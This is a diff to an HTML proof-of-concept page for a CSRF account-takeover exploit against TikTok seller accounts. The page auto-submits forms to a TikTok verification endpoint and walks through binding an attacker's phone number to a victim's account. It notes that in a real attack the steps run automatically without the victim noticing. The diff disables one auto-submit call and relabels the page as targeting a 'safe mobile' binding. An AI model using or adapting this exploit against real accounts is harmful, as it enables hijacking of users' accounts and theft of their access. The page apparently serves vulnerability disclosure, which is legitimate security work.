@@ -82,12 +82,12 @@
                 mobileForm.action= "https://seller-id.tiktok.com/passport/web/send_code/?aid=4068&account_sdk_source=web&language=en";
                 mobileForm.submit();
             }
-          createMobileFormAndSubmit();
+          //createMobileFormAndSubmit();
 </script>
 <h1 style="text-align:center;">takeover victim account on tiktok</h1>
-<h2>Hi this is a POC for takeover tiktok account,I will explain the account takeover vulnerability steps separately, hoping to make people understand the principle of the breakthrough. In a real attack, these steps are automatic and continuous, and the victim will not find anything.</h2>
+<h2>Hi this is a POC for bing safe mobile,the safe email is same under CSRF vulnerability,I will explain the account takeover vulnerability steps separately, hoping to make people understand the principle of the breakthrough. In a real attack, these steps are automatic and continuous, and the victim will not find anything.</h2>
 <h3>Before start attack,please set attacker's phone number for encrypted</h3>
-Your phone number for account takeover(pattern:+86XXXXXXX): <input type="text" name="attackermobile" id="attackermobilenum">
+Your phone number for bind safe mobile on victim's account(pattern:+86XXXXXXX): <input type="text" name="attackermobile" id="attackermobilenum">
 <input type="submit" value="Encryped!" onclick="mobileEncrypted()"/>
 <textarea id="encryptedmobile" width="100" height="20"></textarea>
 <h3>Step 1--Using CSRF vulnerability to get the verify code from attacker mobile on victim account</h3>
@@ -96,7 +96,7 @@ Your phone number for account takeover(pattern:+86XXXXXXX): <input type="text" n
 Your verify code from attacker mobile: <input type="text" name="attackercode" id="attackercodeid">
 <input type="submit" value="Encryped!" onclick="codeEncrypted()"/>
 <textarea id="encryptedcode" width="100" height="20"></textarea>
-<h3>Step 3--Input the encrpted mobile number and verify code from attacker and click the botton then the attacker mobile will blind on victim account</h3>
+<h3>Step 3--Input the encrpted mobile number and verify code from attacker and click the botton then the attacker mobile will bind on victim's account</h3>
 <iframe src=takeover_account.html width="500" height="200" frameborder=”no” border=”0″></iframe>
 </body>
 </html>
